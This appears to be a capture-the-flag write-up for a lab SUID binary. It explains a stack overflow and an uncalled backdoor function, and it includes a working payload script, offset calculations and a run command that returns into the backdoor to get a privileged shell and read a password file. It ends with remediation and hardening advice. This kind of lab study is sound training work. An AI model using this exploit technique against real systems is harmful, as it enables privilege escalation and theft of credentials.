# Rainfall — Level 1: Hidden Function (`ono`)

**Target:** `ono` — SUID `flag01` binary, x86-64 Linux
**Goal:** Read `/home/flag01/.pass`
**Technique:** Stack buffer overflow via oversized `read()` → redirect execution into an
uncalled privileged function (`maintenance_exec`)

---

## 1. Reconnaissance

```bash
ls -la                     # -rwsr-x---  1 flag01 level01 ono   ← SUID bit
checksec --file=./ono
nm ./ono | grep -E " t | T "
```

```
RELRO           STACK CANARY      NX                          PIE
Partial RELRO   No canary found   NX unknown (GNU_STACK       No PIE (0x400000)
                                  missing) — RWX segments
```

| Finding | Meaning |
|---|---|
| **No canary** | Overwriting the saved return address is undetected |
| **No PIE** | All binary code addresses are fixed at link time |
| **SUID flag01** | Code executed by this process carries `euid=flag01` — the win condition |
| **Unstripped symbols** | `nm` lists every function, including ones `main` never calls |

The symbol listing reveals the level's core element — a function no code path reaches:

```
0000000000401276 t maintenance_exec
```

`init_ctx`, `print_header`, `run_diagnostic`, `main` — all called from `main`.
`maintenance_exec` is called by nobody. **Dead code in a SUID binary is a backdoor.**

## 2. The bug

From `ono.c` and confirmed in the disassembly of `run_diagnostic`:

```c
char op_id[OPERATOR_LEN];              // 64 bytes

read(STDIN_FILENO, op_id, 256);        // reads up to 256 — 192 bytes past the buffer
```

```asm
4013a7:  lea  rax,[rbp-0x40]      ; buffer at rbp-0x40
4013ab:  mov  edx,0x100           ; size 256
4013b8:  call read@plt
```

## 3. Anatomy of the backdoor

```asm
0000000000401276 <maintenance_exec>:     ; arg: code (rdi)
  401287:  mov  eax,0xdeadbeef
  40128c:  cmp  QWORD PTR [rbp-0x18],rax  ; if (code == 0xdeadbeef)
  401290:  jne  4012ca                    ; ...else return silently

  ; ---- everything below only runs when the magic value matches ----
  401292:  call geteuid@plt               ; ┐
  401297:  mov  ebx,eax                   ; │ setreuid(geteuid(),
  401299:  call geteuid@plt               ; │            geteuid())
  4012a2:  call setreuid@plt              ; ┘ ruid = euid = flag01
  4012c5:  call execl@plt                 ; execl("/bin/sh", "sh", NULL)
```

Two properties decide the attack:

1. **The `0xdeadbeef` check cannot be passed by a normal call.**
   There is no `pop rdi` gadget in the binary, and at the moment
   `run_diagnostic` returns, `RDI` holds `0x402100` (a string address
   from the last `printf`) — the `cmp` would fail anyway.

2. **The check does not need to pass.** All privileged work lives at
   `0x401292`, the instruction *after* the `jne`. Returning there
   executes the payload without the magic value ever being examined.

Note the `setreuid(geteuid(), geteuid())`: it promotes the **real uid** to
`flag01` before `execl`. Since ruid == euid, the spawned `dash` finds nothing
to drop — no `-p` handling is required. The backdoor is self-contained.

## 4. Computing the offset

```asm
40139e:  sub  rsp,0x40           ; 64 bytes of locals
4013a7:  lea  rax,[rbp-0x40]     ; op_id
  ...
40144a:  leave
40144b:  ret
```

```
rbp-0x40   op_id[64]        ← offset  0
rbp+0x00   saved RBP        ← offset 64
rbp+0x08   return address   ← offset 72  ★
```

**Offset = 0x40 + 8 = 72 bytes.**

## 5. The payload

```bash
python3 - <<'EOF'
import struct
payload = b"ONO_" + b"A"*68 + struct.pack("<Q", 0x401292)
open("/tmp/pwn1", "wb").write(payload)
print(f"[+] wrote {len(payload)} bytes")
EOF
```

- 72 bytes of filler reach the saved return slot.
- The `ONO_` prefix makes the program print **"Operator recognized"** —
  in-band confirmation that the intended payload was actually read.
- `0x401292` is the address of the `geteuid` call inside `maintenance_exec`.

**Verify the bytes before firing:**

```bash
xxd /tmp/pwn1
```

```
00000000: 4f4e 4f5f 4141 ... 4141   ONO_AAAA...
00000040: 4141 4141 4141 4141 9212 4000 0000 0000   AAAAAAAA..@.....
```

Total 80 bytes (`0x50`); at offset `0x48` (= 72): `92 12 40 00 00 00 00 00`
= `0x401292` little-endian.

A stale payload file produces a clean signature: the program prints
**"Unknown operator"** (first bytes are not `ONO_`) followed by a segfault
(return slot contains `0x4141414141414141`). The program's own output
identifies what it read — regenerate and re-verify whenever that appears.

## 6. Execution

```bash
(cat /tmp/pwn1; cat) | ./ono
```

Output: *Operator recognized. Running diagnostics...* — then the process
returns straight into the backdoor: `setreuid` promotes the real uid,
`execl` spawns the shell. No prompt appears; type anyway:

```
id
cat /home/flag01/.pass
```

```
uid=1018(flag01) gid=1004(level01) euid=1018(flag01)
```

Real uid **and** effective uid are `flag01` — the `setreuid` call did its
job before `execl`, so the shell is fully privileged. The flag prints.

## 7. Why no gdb, no ASLR handling

This exploit never injects code and never references the stack. It returns
into an address baked into the binary at link time. `0x401292` is identical
on every run of this binary regardless of system randomization. The entire
attack is a redirect of control flow to existing, legitimate, privileged code.

For optional GDB inspection, if startup reports
`Permission denied: '/opt/pwndbg/.venv/uv.lock.hash'`, use:

```bash
gdb -nx -q ./ono
```

`-nx` skips GDB initialization files, so pwndbg does not start and trigger the permission error. **Level 02 example:** `gdb -nx -q ./dixie`.

## 8. Attack chain summary

```
1. checksec            → no canary, no PIE → overflow + fixed addresses
2. nm                  → maintenance_exec exists, called by no one
3. disassembly         → privileged payload at 0x401292, magic check can be skipped
4. offset math         → 0x40 buffer + 8 saved RBP = 72
5. payload             → 72 filler bytes + 0x401292
6. fire                → "Operator recognized" confirms, shell inherits flag01
7. cat /home/flag01/.pass
```

---

## 9. How to protect against this

### 9.1 Fix the code (the root cause)

Bound the read to the destination size:

```c
char op_id[OPERATOR_LEN];

ssize_t n = read(STDIN_FILENO, op_id, sizeof(op_id) - 1);
if (n < 0) {
    perror("read");
    exit(1);
}
op_id[n] = '\0';
```

With the size capped at 64, bytes can never reach the saved return
address — the overflow becomes impossible by construction.

### 9.2 Remove the backdoor

`maintenance_exec` is **static and never referenced** — the compiler itself
flags it at build time:

```
$ gcc -Wall -c ono.c
ono.c:21:13: warning: 'maintenance_exec' defined but not used [-Wunused-function]
```

Treating warnings as errors makes shipping this binary impossible:

```bash
gcc -Wall -Werror ...
```

Additional rules this function violates:

- **Dead privileged code is attack surface.** Uncalled code rots silently
  and waits; delete it, don't disable it.
- **Magic constants are not authentication.** `0xdeadbeef` is visible to
  anyone with `objdump`. A comparison inside the binary is not access
  control — the binary and all its bytes belong to the attacker.
- **A SUID binary should never spawn an interactive shell.** Privileged
  helpers should do one audited operation and drop privileges immediately
  (`seteuid(getuid())` before touching user input). The `setreuid(geteuid(),
  geteuid())` + `execl("/bin/sh")` pair is precisely the sequence that must
  not exist in such a program.

### 9.3 Compiler hardening

```bash
gcc -O2 \
    -fstack-protector-all \
    -fPIE -pie \
    -Wl,-z,noexecstack \
    -Wl,-z,relro,-z,now \
    ono.c -o ono
```

| Flag | Effect on this attack |
|---|---|
| `-fstack-protector-all` | Canary between buffer and saved RIP; the crafted `ret` never executes — aborts on overwrite detection. |
| `-fPIE -pie` | Code addresses randomized per run; `0x401292` becomes unknown to the attacker without an info leak. |
| `-z noexecstack` | Irrelevant here (no code was injected) — noted because it also does **not** stop this class of attack: returning to legitimate code executes no stack bytes. NX defeats injection, not redirection. |

This last point is the important architectural lesson: **an executable-stack
protection cannot stop a return-to-function exploit.** Redirect attacks are
stopped *before* the return (canary), made *unaimable* (PIE + ASLR), or
eliminated *at the source* (bounds check, dead-code removal). Each layer
covers a different failure of the others.

### 9.4 Mapping defenses to attack steps

```
Attack step                          Defense that stops it
───────────────────────────────────  ─────────────────────────────────
read() of 256 into 64 bytes          bounded read (sizeof)      → no overflow
overwrite 72 bytes past the buffer   stack canary               → detected, abort
return to 0x401292                   PIE + ASLR                 → address unknown
skip the 0xdeadbeef check            backdoor doesn't exist     → nothing to skip
spawn privileged shell               no SUID shell pattern      → no privilege source
read the flag                        file permissions (.pass)   → last line of defense
```
